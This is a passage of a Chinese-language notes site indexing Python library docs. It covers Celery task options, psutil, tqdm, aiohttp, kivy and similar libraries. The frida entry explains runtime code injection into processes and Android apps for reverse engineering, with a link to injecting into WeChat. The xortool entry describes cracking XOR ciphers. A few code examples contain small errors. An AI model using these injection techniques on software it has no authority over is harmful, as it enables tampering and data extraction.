delivery_info 添加附加传递消息，主要用于包含交付任务的交换和路由键的映射，retry() 主要用于重新讲任务下发到队列中，该 dict 中的键可用取决于使用的消息中间人（Broker）。 reply-to 回复的发送的队列名称（例如，与 RPC 结果后端一起使用） called_directly 如果职程（Worker）未执行任务，则此标志设置为true timelimit 当前(软、硬)时间限制的元组(如果有的话) callbacks 如果此任务成功返回，将调用的签名列表 errback 如果此任务失败，将调用的签名列表 utc 设置为 true ，启用 UTC headers 与任务消息一起发送的消息头的映射（可以为 None） reply_to 回复的地址（队列名称） correlation_id 一般与任务的ID相同，通常用于AMQP中跟踪回复的内容 root_id 此任务所属工作流中的第一个任务的唯一ID（如果有） parent_id 调用此任务的任务的惟一id（如果有） chain 反转形成链的任务列表（如果有）。列表中最后一个任务是当前任务执行成功之后的下一个任务。如果使用任务协议的第一个版本，则链任务将位于 request.callbacks 中 案例 访问上下文访问信息的一个任务案例: @app.task(bind=True) def dump_context(self, x, y): print('Executing task id {0.id}, args: {0.args!r} kwargs: {0.kwargs!r}'.format( self.request)) bind 参数表示该函数绑是一个绑定方法，可以通过访问任务类型实例中的属性和方法。 任务重试 使用装饰器参数的方式 有时，您只想在引发特定异常时重试任务。 可也通过 Celery 中 task() 装饰器中的 autoretry_for 参数进行自动重试任务: from twitter.exceptions import FailWhaleError @app.task(autoretry_for=(FailWhaleError,)) def refresh_timeline(user): return twitter.refresh_timeline(user) 可以通过 task() 中的 retry_kwargs 参数来指定 retry() 内部调用参数: @app.task(autoretry_for=(FailWhaleError,), retry_kwargs={'max_retries': 5}) def refresh_timeline(user): return twitter.refresh_timeline(user) 上面的示例与在 try ... except 语句中包含的代码块使用 retry 效果一致: @app.task def refresh_timeline(user): try: twitter.refresh_timeline(user) except FailWhaleError as exc: raise div.retry(exc=exc, max_retries=5) 如果你想自动重试任何错误，只需使用: @app.task(autoretry_for=(Exception,)) def x(): ... 手动捕获的方式 见 retry 任务状态 内置状态 PENDING 任务正在等待执行或未知。任何未知的任务 ID 都默认处于挂起状态。 STARTED 任务已经开始。默认情况下不会记录，需要启用，请参阅 app.Task.track_started.。 meta-data：正在执行任务的职程（Worker） pid 和主机名。 SUCCESS 任务执行成功。 meta-data：任务结果返回值 propagates：Yes ready: Yes FAILURE 任务执行失败。 meta-data：执行异常时的任务信息，其中 traceback 包含引发错误的堆栈信息。 propagates：Yes RETRY 任务处于重试状态。 meta-data：结果信息包含导致重试的异常信息，traceback 包含引发异常时堆栈的回溯。 propagates：No REVOKED 任务被撤销。 propagates：Yes 自定义状态 使用 update_state() 更新任务状态 只需要设置一个位置的名称，就可以轻松的自定义状态，状态名通常是大写的字符串。 例如，您可以查看定义自定义中止状态的可中止任务: @app.task(bind=True) def upload_files(self, filenames): for i, file in enumerate(filenames): if not self.request.called_directly: self.update_state(state='PROGRESS', meta={'current': i, 'total': len(filenames)}) 在这里，创建了一个名称为\" PROGRESS\"的状态，通过 current 和 total 作为元数据的一部分， 计算任务当前正在进行状态的任何应用程序以及任务在进程中位置。可以通过该方法来创建任务进度条。 自定义任务类 所有的任务都继承 app.Task 类，run() 方法为任务体。 例如: @app.task def add(x, y): return x + y 在内部大概会是这样: class _AddTask(app.Task): def run(self, x, y): return x + y add = app.tasks[_AddTask.name] 任务调用 apply_async , 发送一个任务消息 delay , 直接发送一个任务消息,但是不支持运行参数 calling , 应用一个支持调用接口（例如，add(2,2)）的对象, 意味着任务不会被一个 worker 执行,但是会在当前线程中执行(但是消息不会被发送) apply_async delay calling 任务回调 task支持的函数回调 after_return 任务返回后调用的处理程序 on_failure 任务执行失败时，由职程（Worker）调用。 on_retry 任务重试时，由职程（Worker）调用。 on_success 任务成功时，由职程（Worker）调用。 after_return on_failure on_retry on_success 获取回调改变/状态-on_message Celery 可以通过消息回调获取所有状态的改变。例如对于长时任务发送人任务进程，你可以这样做: @app.task(bind=True) def hello(self, a, b): time.sleep(1) self.update_state(state=\"PROGRESS\", meta={'progress': 50}) time.sleep(1) self.update_state(state=\"PROGRESS\", meta={'progress': 90}) time.sleep(1) return 'hello world: %i' % (a+b) def on_raw_message(body): print(body) r = hello.apply_async(4, 6) print(r.get(on_message=on_raw_message, propagate=False)) 将生成如下输出: {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7', 'result': {'progress': 50}, 'children': [], 'status': 'PROGRESS', 'traceback': None} {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7', 'result': {'progress': 90}, 'children': [], 'status': 'PROGRESS', 'traceback': None} {'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7', 'result': 'hello world: 10', 'children': [], 'status': 'SUCCESS', 'traceback': None} hello world: 10 限制时间-ETA and Countdown ETA (estimated time of arrival, 预计到底时间) 让你设置一个日期和时间，在这个时间之前任务将被执行。 countdown 是一种以秒为单位设置ETA的快捷方式: >>> result = add.apply_async((2, 2), countdown=3) >>> result.get() # this takes at least 3 seconds to return 20 确保任务在指定的日期和时间之后的某个时间执行，但不一定在该时间执行。 可能原因可能包括许多项目在队列中等待，或者严重的网络延迟。为了确保您的任务及时执行，你应该监视队列中的拥塞情况。 使用Munin或类似工具来接收警报，因此可以采取适当的措施来减轻负载。点击查看Munin。 尽管 countdown 是整数，但eta必须是一个 datetime 对象，并指定确切的日期和时间（包括毫秒精度和时区信息）: >>> from datetime import datetime, timedelta >>> tomorrow = datetime.utcnow() + timedelta(days=1) >>> add.apply_async((2, 2), eta=tomorrow) expries 参数定义了一个可选的到期时间，既可以作为任务之后秒发布，或在特定日期和时间使用 datetime: >>> # Task expires after one minute from now. >>> add.apply_async((10, 10), expires=60) >>> # Also supports datetime >>> from datetime import datetime, timedelta >>> add.apply_async((10, 10), kwargs, ... expires=datetime.now() + timedelta(days=1) 当 worker 收到过期的任务时，它将任务标记为REVOKED 创建连接池 自动池支持 从2.3版开始，支持自动连接池，因此您不必手动处理连接和发布者即可重用连接。 从2.5版开始，默认情况下启用连接池。 您可以通过创建发布者来手动处理连接: results = [] with add.app.pool.acquire(block=True) as connection: with add.get_publisher(connection) as publisher: try: for args in numbers: res = add.apply_async((2, 2), publisher=publisher) results.append(res) print([res.get() for res in results]) 尽管这是个特定示例，但是可以更好的展现一组: >>> from celery import group >>> numbers = [(2, 2), (4, 4), (8, 8), (16, 16)] >>> res = group(add.s(i, j) for i, j in numbers).apply_async() >>> res.get() [4, 8, 16, 32]","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-task.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-task.html"},{"title":"frida","text":"官网: https://frida.re/docs/home/ 安装: pip install frida frida是一款基于python + javascript 的hook框架， 可运行在androidioslinuxwinosx等各平台，主要使用动态二进制插桩技术 插桩技术 插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种： 源代码插桩[Source Code Instrumentation(SCI)]：额外代码注入到程序源代码中 二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中。 静态二进制插桩[Static Binary Instrumentation(SBI)]： 在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件 动态二进制插桩[Dynamic Binary Instrumentation(DBI)]： 在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。 Frida 是一个用于动态分析和修改应用程序的工具， 它提供了一种在运行时注入代码到目标应用程序中的方式。 在 Python 中，Frida 提供了一个名为 \"frida\" 的模块，用于与 Frida 运行时进行交互。 使用 Frida，你可以在目标应用程序的运行过程中实时地监视和修改函数调用、修改内存中的数据、拦截网络通信等。 它支持多种平台，包括 Android、iOS、Windows、macOS 和 Linux。 在 Python 中，通过导入 \"frida\" 模块， 你可以编写代码来创建 Frida 会话、加载目标应用程序、注入 JavaScript 或者使用 Python API 进行交互。 这使得你可以利用 Frida 来进行应用程序的动态分析、逆向工程、漏洞挖掘等任务。 下面是一个示例代码片段，展示了如何使用 \"frida\" 模块创建 Frida 会话和加载目标应用程序: import frida # 创建 Frida 会话 , 也就是附加到进程 session = frida.attach(\"app.exe\") # 打印目标应用程序的进程 ID print(\"Process ID:\", session.pid) # ... # 执行其他操作，如加载脚本、拦截函数调用等 # ... # 关闭会话 session.detach() 需要注意的是，Frida 还提供了其他语言的支持， 如 JavaScript、C#、Swift 等， 使得开发者可以根据自己的喜好和需求选择合适的编程语言进行应用程序的动态分析和修改。 注解 比如侵入到微信进程中提取表情包: https://github.com/K265/frida-wechat-sticker/tree/main FRIDA一般在系统层面的调用都是JS代码. frida的注入脚本是JavaScript， 因此我们后面都是通过js脚本来操作设备上的Java代码的。 其他点: 由于js代码注入时可能会出现超时的错误， 为了防止这个问题， 我们通常还需要在最外面包装一层 setImmediate(function(){}) 的代码。 frida-工具 共有6个： frida CLI: 是一个交互式解释器（REPL），他的交互形式跟IPython很类似。 frida-ps: 用于列出进程的一个命令行工具，当我们需要跟远程系统进行交互的时候，这个是非常有用的。 frida-trace frida-discover frida-ls-devices frida-kill 常用输出 console-普通打印 与普通JS输出一致: console.log('xxx') console.warn('xxx') console.error('xxx') hexdump-打印内存地址信息 target参数可以是ArrayBuffer或者NativePointer, 而options参数则是自定义输出格式可以填这几个参数offset、lengt、header、ansi。 示例: var libc = Module.findBaseAddress('libc.so'); console.log(hexdump(libc, { offset: 0, length: 64, header: true, ansi: true })); send回调-Python send是在python层定义的on_message回调函数， jscode内所有的信息都被监控script.on('message', on_message)， 当输出信息的时候on_message函数会拿到其数据再通过format转换， 其最重要的功能也是最核心的是能够直接将数据以json格式输出， 当然数据是二进制的时候也依然是可以使用send: # -*- coding: utf-8 -*- import frida import sys def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) jscode = \"\"\" Java.perform(function () { var jni_env = Java.vm.getEnv(); console.log(jni_env); send(jni_env); }); \"\"\" process = frida.get_usb_device().attach('com.roysue.roysueapplication') script = process.create_script(jscode) script.on('message', on_message) script.load() sys.stdin.read() 运行脚本效果如下: roysue@ubuntu:~/Desktop/Chap09$ python Chap03.py [object Object] [*] {'handle': '0xdf4f8000', 'vm': {}} 可以看出这里两种方式输出的不同的效果，console直接输出了[object Object]，无法输出其正常的内容，因为jni_env实际上是一个对象，但是使用send的时候会自动将对象转json格式输出 参考: FRIDA-API使用篇：rpc、Process、Module、Memory使用方法及示例 详解Hook框架frida，让你在逆向工作中效率成倍提升 看起来最推荐: https://juejin.cn/post/7308240524964134924 待看 hook工具frida原理及使用, Java程序使用","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Frida.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Frida.html"},{"title":"Jinja2","text":"一个仿照 Django 的模版引擎, 安装: pip install Jinja2 加载模版: >>> from jinja2 import Template as T >>> t = T('ti is a test msg, say {{ msg }}') >>> t.render(msg='you say say you') 'ti is a test msg, say you say say you' >>> 部分语法: 代码块: {% 代码块 %} 变量: {{ 变量 }} 注释: {# 注释 #} 行语句, 行内语句为 Python 代码: # 行语句 过滤器, 使用管道符号, 支持链式: {{ 变量 | 函数1 | 函数2 }} 一些预定义函数 字符串操作: safe, 禁用转义 capitalize, 把变量值的首字母转成大写，其余字母转小写 lower, 把值转成小写 upper, 把值转成大写 title, 把值中的每个单词的首字母都转成大写 reverse, 字符串反转 format, 格式化输出 striptags, 渲染之前把值中所有的HTML标签都删掉 truncate: 字符串截断 列表操作: first, 取第一个元素 last, 取最后一个元素 length, 获取列表长度 sum, 列表求和 sort, 列表排序 常用逻辑: 判断: {% if 条件 %} 此处可以是html 代码 {% endif %} 注意等价于: # if 条件 此处可以是html 代码 # endif 循环: {% for x in 列表 %} 此处可以是html 代码 {% endfor %}","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Jinja2.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Jinja2.html"},{"title":"m3u8","text":"pypi官网地址: https://pypi.org/project/m3u8/ 安装: pip install m3u8 媒体文件转换为m3u8格式. 一般与 /docs/后端/python/python三方库/ffmpeg 一起使用. 加载m3u8文件, 参数为本地位置或网络url: m3u8.load(file_or_url)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-M3U8.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-M3U8.html"},{"title":"psutil","text":"便捷的系统监控工具. 安装: pip install psutil 获取cpu信息 获取cpu信息: psutil.cpu_times() 获取内存信息 使用psutil获取物理内存和交换内存信息，分别使用: psutil.virtual_memory() psutil.swap_memory() 获取磁盘信息 可以通过psutil获取磁盘分区、磁盘使用率和磁盘IO信息: psutil.disk_partitions() # 磁盘分区信息 psutil.disk_usage('/') # 磁盘使用情况 psutil.disk_io_counters() # 磁盘IO 获取网络信息 psutil可以获取网络接口和网络连接信息: psutil.net_io_counters() # 获取网络读写字节／包的个数 psutil.net_if_addrs() # 获取网络接口信息 psutil.net_if_stats() # 获取网络接口状态 要获取当前网络连接信息，使用net_connections(): psutil.net_connections() 若权限不足需要获取权限, 如 sudo 启动 (因为会调用系统的接口) 获取进程信息 通过psutil可以获取到所有进程的详细信息: >>> psutil.pids() # 所有进程ID [3865, 3864, 3863, 3856, 3855, 3853, 3776, ..., 45, 44, 1, 0] >>> p = psutil.Process(3776) # 获取指定进程ID=3776，其实就是当前Python交互环境 >>> p.name() # 进程名称 'python3.6' >>> p.exe() # 进程exe路径 '/Users/michael/anaconda3/bin/python3.6' >>> p.cwd() # 进程工作目录 '/Users/michael' >>> p.cmdline() # 进程启动的命令行 ['python3'] >>> p.ppid() # 父进程ID 3765 >>> p.parent() # 父进程 <psutil.Process(pid=3765, name='bash') at 4503144040> >>> p.children() # 子进程列表 [] >>> p.status() # 进程状态 'running' >>> p.username() # 进程用户名 'michael' >>> p.create_time() # 进程创建时间 1511052731.120333 >>> p.terminal() # 进程终端 '/dev/ttys002' >>> p.cpu_times() # 进程使用的CPU时间 pcputimes(user=0.081150144, system=0.053269812, children_user=0.0, children_system=0.0) >>> p.memory_info() # 进程使用的内存 pmem(rss=8310784, vms=2481725440, pfaults=3207, pageins=18) >>> p.open_files() # 进程打开的文件 [] >>> p.connections() # 进程相关网络连接 [] >>> p.num_threads() # 进程的线程数量 1 >>> p.threads() # 所有线程信息 [pthread(id=1, user_time=0.090318, system_time=0.062736)] >>> p.environ() # 进程环境变量 {'SHELL': '/bin/bash', 'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:...', 'PWD': '/Users/michael', 'LANG': 'zh_CN.UTF-8', ...} >>> p.terminate() # 结束进程 Terminated: 15 <-- 自己把自己结束了 和获取网络连接类似，获取一个root用户的进程需要root权限，启动Python交互环境或者.py文件时，需要sudo权限。 psutil还提供了一个test()函数，可以模拟出ps命令的效果: >>> import psutil >>> psutil.test() USER PID %MEM VSZ RSS TTY START TIME COMMAND root 0 24.0 74270628 2016380 ? Nov18 40:51 kernel_task root 1 0.1 2494140 9484 ? Nov18 01:39 launchd root 44 0.4 2519872 36404 ? Nov18 02:02 UserEventAgent root 45 ? 2474032 1516 ? Nov18 00:14 syslogd root 47 0.1 2504768 8912 ? Nov18 00:03 kextd root 48 0.1 2505544 4720 ? Nov18 00:19 fseventsd _appleeven 52 0.1 2499748 5024 ? Nov18 00:00 appleeventsd root 53 0.1 2500592 6132 ? Nov18 00:02 configd ... 使用技巧 例如用来回收自己残留的子进程: _pid = os.getpid() pro = psutil.Process(_pid) pro.terminate()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-PSUTIL.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-PSUTIL.html"},{"title":"pathos","text":"github地址:: pathos-github 官方文档:: pathos-doc 官网下载文档(pdf):: pythos-pdf <../../../../resources/pdf/1202.1056.pdf> github开头就说提供一个并行的图形化管理... 没看懂... 下有用模块: dill: serialize all of Python pox: utilities for filesystem exploration and automated builds klepto: persistent caching to memory, disk, or database multiprocess: better multiprocessing and multithreading in Python ppft: distributed and parallel Python pyina: MPI parallel map and cluster scheduling pathos: graph management and execution in heterogeneous computing 有用的方法/类 pathos.abstract_launcher [worker pool API 定义] pathos.pools [所有 pathos worker pools] pathos.core [高级命令接口] pathos.hosts [hostname 注册接口] pathos.serial.SerialPool [python 串行 worker pool] pathos.parallel.ParallelPool [python 并行 worker pool] pathos.multiprocessing.ProcessPool [the multiprocessing worker pool] pathos.threading.ThreadPool [the multithreading worker pool] pathos.connection.Pipe [the launcher base class] pathos.secure.Pipe [the secure launcher base class] pathos.secure.Copier [the secure copier base class] pathos.secure.Tunnel [the secure tunnel base class] pathos.selector.Selector [the selector base class] pathos.server.Server [the server base class] pathos.profile [profiling in threads and processes] pathos.maps [standalone map instances] 同时提供了两个命令, 支持便捷建立安全连接, 脚本已安装到环境变量下, 所以直接命令调用即可. portpicker [get the portnumber of an open port] pathos_connect [establish tunnel and/or RPC server] 使用 --help 获取帮助信息.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Pathos.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Pathos.html"},{"title":"progress","text":"安装: pip install progress 关于进度条可参见: ProgressInPy 主要是用来 progress.bar 做进度条控制的: from progress.bar import Bar def print_hi(): n = 10000 with Bar('进度', max=n) as bar: for i in range(n): for j in range(n): j += i bar.next() 效果","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Progress.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Progress.html"},{"title":"tqdm","text":"也是用来做进度控制的 关于进度条可参见: ProgressInPy 安装: pip install pqdm 例子: from tqdm import tqdm, trange def print_hi(): n = 10000 # 也可以 # for i in trange(n): for i in tqdm(range(n)): for j in range(n): j += i 效果: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 10000/10000 [00:02<00:00, 4132.14it/s] 还可以跟 /docs/后端/python/python三方库/rich 一起弄彩色进度条 也可以与 notebook, tk等一起: # 彩色进度 from tqdm.rich import tqdm, trange # 兼容 jupyter from tqdm.notebook import tqdm, trange # tk进度条 from tqdm.tk import tqdm, trange 如果是非循环代码的进度条, 直接定义tqdm对象即可: bar = tqdm(total=100) ... bar.update(10) ... bar.update(30) ... ...","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-TQDM.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-TQDM.html"},{"title":"xortool","text":"安装: pip install xortool xortool 是一个用于分析和破解 XOR 密码的 Python 工具。 XOR（异或）是一种简单的加密算法，它将明文与一个密钥进行按位异或运算，从而产生密文。 xortool 旨在自动化分析 XOR 密文并尝试找到密钥，以便解密数据。 使用 xortool，你可以通过以下方式进行 XOR 密码分析： 密文频率分析：xortool 可以分析密文的频率分布，并根据字符出现的频率猜测密钥的长度。 密钥长度猜测：xortool 提供了几种自动猜测密钥长度的方法， 包括指数重复密钥长度检测（Index of Coincidence）和最长重复字串长度检测（Longest Repeated Substring）。 密钥搜索：xortool 将使用不同的方法来搜索可能的密钥，包括暴力破解和基于密文频率的猜测。 解密结果输出：一旦找到可能的密钥，xortool 可以将解密结果输出到文件或终端。 xortool 是一个强大的工具，尤其适用于简单的 XOR 加密和小密钥长度。 然而，对于更复杂的加密算法和长密钥长度，xortool 的效果可能会受到限制。 这是一个命令行工具: xortool file.bin","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Xortool.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Xortool.html"},{"title":"aiohttp","text":"官网:: Welcome to AIOHTTP 异步的网络连接库 , 内部存在 asyncio 库的调用, 如 run_in_executor 安装: pip install aiohttp 默认的编码库 charset-normalizer 较慢, 可使用 cchardet 替代: $ pip install cchardet 算了, 现在 cchardet 已经没维护了, 不支持大于 3.10 的版本. 建议安装 aiodns 库, 更快的 dns 解析: pip install aiodns aiohttp.web.Application 创建web服务器所用类 增加路径映射: app = Application() app.router.add_static() 除了 add_static, 还有 add_get 等 或者使用直接给整个路径的列表: app.add_routes([ web.get('/', handle), web.get('/{name}', handle) ]) server处理 一个server处理示例: from aiohttp import web async def handle(request): name = request.match_info.get('name', \"Anonymous\") text = \"Hello, \" + name return web.Response(text=text) app = web.Application() app.add_routes([web.get('/', handle), web.get('/{name}', handle)]) 在aiohttp的web应用中,handler函数接受的request是aiohttp.web.Request对象。 aiohttp.web.Request对象包含了客户端发来的HTTP请求的所有详情,我们可以从中获取: - 请求方法(method) - 请求URL(url) - 请求头(headers) - 请求体(body) - Query参数(query) - 等等 可以这样处理: async def handle_rpc(request: aiohttp.web.Request): method = request.method url = request.url headers = request.headers query = request.query # 获取query参数 # 获取请求体 data = await request.text() # 获取字符串 data = await request.read() # 获取byte流 data = await request.json() # 获取JSON # 构造响应 response = aiohttp.web.Response(text='result') return response 举例 客户端代码举例: import aiohttp import asyncio async def main(): async with aiohttp.ClientSession() as session: async with session.get('http://python.org') as response: print(\"Status:\", response.status) print(\"Content-type:\", response.headers['content-type']) html = await response.text() print(\"Body:\", html[:15], \"...\") loop = asyncio.get_event_loop() loop.run_until_complete(main()) server 代码举例: from aiohttp import web async def handle(request): name = request.match_info.get('name', \"Anonymous\") text = \"Hello, \" + name return web.Response(text=text) app = web.Application() app.add_routes([web.get('/', handle), web.get('/{name}', handle)]) if __name__ == '__main__': web.run_app(app) 使用 get 请求举例: async def main_aiohttp(): async with aiohttp.request(method='get', url='https://docs.aiohttp.org/en/stable/') as r: print(r) if __name__ == '__main__': import aiohttp asyncio.run(main_aiohttp()) 一些说明 最近开发的时候遇到网络库的问题, 背景如下: 公司自己有基于 C 的 GUI 库, 这个库被编译为了 Python 框架, 然后重写了 asyncio 的事件循环(为了结合这个框架的事件循环) 发现在使用 loop.run_in_executor 时, 且传入的函数为 requests 的调用时: def try_connect(address: str): try: with requests.get(address): return True expect: return False 且在 虚拟机/云桌面 运行时, 会存在异常, 此处的 expect 可以说是无效, 看着是这个异常导致后面哪有问题. 也看不了堆栈信息. debug 又不会出现这个问题. 总结下来就是, 丢到线程池执行器内部执行, 且 requests.get 存在异常时, 且平台为虚拟机时, 一定会触发. 后面有空看看官方自己的事件循环有没有这个问题. 最后换了 aiohttp 就解决了. 还不确定是 requests 库本身的问题, 还是公司框架内部的事件循环有问题","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-aiohttp.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-aiohttp.html"},{"title":"alive-progress","text":"关于进度条可参见: ProgressInPy 安装: pip install alive-progress 与 /docs/后端/python/python三方库/progress 类似, 不过更花哨: from alive_progress.styles import showtime def print_hi(): showtime()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-alive-progress.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-alive-progress.html"},{"title":"cerberus","text":"前言 cerberus 是一个用于数据表单校验的三方包 支持选项 cerberus支持规则 选项 type 类型, 如string, int, datetime required 是否必填, True/False minlength 数据最小长度 maxlength 数据最大长度 regex 数据使用正则规则校验, 如 '&#94;0[0-9]{9}$' coerce 数据转换, 如转换日期为某个需要的, 值为函数 allowed 列表, 只能为列表内有的值 allof 列表, 多个条件的列表, 其中的条件都需要满足 anyof 列表, 满足任一条件即可 noneof 列表, 多个条件的列表, 其中的条件都不需要满足 oneof 满足此约束 check_with 函数, 使用函数检查, 注意参数列表为: field, value, error contains 列表或者字符串, 实际数据集需包含所有枚举 dependencies 值为另一个数据列, 当前列有值时, 另一个数据列必须有值 empty True/False, 是否允许为空 excludes 字符串列表或者字符串, 实际值必不包含其中 forbidden 字符串列表或者字符串, 禁止填写的值, 与上一个类似 items 列表, 实际填写的值需与此处对应, 有顺序之分 keysrules 字典, 可填写其他规则, 规范定义数据字典的键 meta 一个描述, 不用与规则 min 数据最小值 max 数据最大值 nullable True/False, 是否可为None readonly True, 数据字段是否只读 require_all 所有属性都必填 技巧 参考: Validation Rules 如定义一个字典验证器: schema = { 'name': {'type': 'string', 'required': True}, 'age': {'type': 'integer', 'min': 18, 'max': 99}, 'email': {'type': 'string', 'regex': r'&#94;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'} } 示例","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cerberus.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cerberus.html"},{"title":"clint","text":"进度条功能实现模块","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-clint.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-clint.html"},{"title":"ffmpeg-python","text":"安装: pip install ffmpeg-python 媒体文件处理","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-ffmpeg.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-ffmpeg.html"},{"title":"jsonrpc","text":"注解 这玩意儿不止一个, 看了一下, 有 jsonrpc, json-rpc, python-jsonrpc ... 都觉得别人的轮子不好用要自己造是吧, 没有技巧, 全是毒, 这一篇没啥具体要写的 基于json的跨语言远程调用协议. 调用的json格式: { \"method\": \"方法名\", \"params\": [\"参数数组\"], \"id\": 方法ID } 返回的json格式: { \"jsonrpc\": \"2.0\", \"id\": \"1234\", \"result\": null }","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jsonRPC.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jsonRPC.html"},{"title":"安装kivy","text":"官网安装介绍: https://kivy.org/doc/stable/gettingstarted/installation.html 一般都是用的桌面系统开发, 所以直接使用 pip安装即可: pip install \"kivy[full]\" kivy_examples 可惜我用我的老Mac安装失败了, base Python3.11: ... Updated /private/var/folders/4x/bpwwvvpn6d38ckdfw01fdggc0000gn/T/pip-install-nkzgam0u/kivy_f50690eb2e4f4577bf77f4119d23842a/kivy/include/config.pxi Updated build/lib.macosx-13-x86_64-cpython-311/kivy/setupconfig.py Updated /private/var/folders/4x/bpwwvvpn6d38ckdfw01fdggc0000gn/T/pip-install-nkzgam0u/kivy_f50690eb2e4f4577bf77f4119d23842a/kivy/setupconfig.py Detected compiler is unix error: command '/usr/bin/clang' failed with exit code 1 [end of output] note: This error originates from a subprocess, and is likely not a problem with pip. ERROR: Failed building wheel for kivy Failed to build kivy ERROR: Could not build wheels for kivy, which is required to install pyproject.toml-based projects 查询说需要安装python-dev, 但是Mac又没有这玩意儿, 然后去github Kivy won't install on Python 3.11.0 上看了一下, 直接安装master的解决: pip install \"kivy[full] @ https://github.com/kivy/kivy/archive/master.zip\"","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Install-Kivy.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Install-Kivy.html"},{"title":"使用-kv语言","text":"官网文档: https://kivy.org/doc/stable/gettingstarted/rules.html kivy设计的类似于Python的语言, 将逻辑与构建分离, 初步感觉能减少部分工作量. 后缀为kv, 文件名为应用程序入口类名App前面的字符串的小写.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use--kv-language.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use--kv-language.html"},{"title":"使用-属性声明","text":"官网: https://kivy.org/doc/stable/gettingstarted/properties.html kivy提供了属性构造的方法, 比如一个数字: numeric_var = NumericProperty(1) 主要用于与kv文件的属性交互, 有以下优点 支持值的自动变更 校验值是否符合要求 优化内存管理 警告 需要在类级别声明, 即声明为类变量. 支持定义 on_<propertyname> 实例方法来获取值变更事件. 提供的属性: NumericProperty 数字 StringProperty 字符串 ListProperty 列表 ObjectProperty Python类实例 BooleanProperty bool BoundedNumericProperty 区间值, 如: number = BoundedNumericProperty(0, min=-5, max=5) 表示默认值为0, 最小为-5, 最大为5 OptionProperty ReferenceListProperty AliasProperty DictProperty 字典 VariableListProperty ConfigParserProperty ColorProperty 颜色, 支持的参数类型: 三或四个float在0到1之间的值, 默认为1 (1.0, 1.0, 1.0, 1.0) 字符串类型的颜色进制, 如 #rrggbb or #rrggbbaa 字符串类型颜色名, 如 red, yellow","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use-attribute-declaration.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use-attribute-declaration.html"},{"title":"line_profiler","text":"性能调优模块, 有个类似的 /docs/后端/python/python三方库/memory_profiler 官网: https://pypi.org/project/line-profiler/ 安装: pip install line_profiler 方法1 使用 @profile 装饰器后: kernprof -lv script_to_profile.py 貌似也直接可以用代码: from line_profiler import LineProfiler def base_func3(): for n in range(10000): print(f'当前n的值是：{n}') lp = LineProfiler() lp_wrap = lp(base_func3) lp_wrap() lp.print_stats()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-line_profiler.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-line_profiler.html"},{"title":"maturin","text":"将 Rust 代码编译为Python包 安装: pip install maturin Python包生成 先进入 项目根目录 , 然后执行: maturin init 会生成 Cargo.toml 和 lib.rs 然后: maturin develop 如果之前没配置过Rust， 参考 /docs/后端/rust/index","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-maturin.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-maturin.html"},{"title":"memory_profiler","text":"性能调优模块, 有个类似的 /docs/后端/python/python三方库/line_profiler 官网: https://pypi.org/project/memory-profiler/ 安装: pip install memory_profiler 最简单的使用就是使用装饰器: from memory_profiler import profile @profile def count(): a += 1 ... 输出头的含义: Line # Mem usage Increment Occurrences Line Contents 分别为: 代码所在行; 内存总共占用, 增加的内存; 运行次数; 代码内容 找内存泄漏，直接看Increment; 如果想找内存瓶颈，就看Mem usage mprof指令 安装此模块时候, 一般会同时安装以下mprof指令, 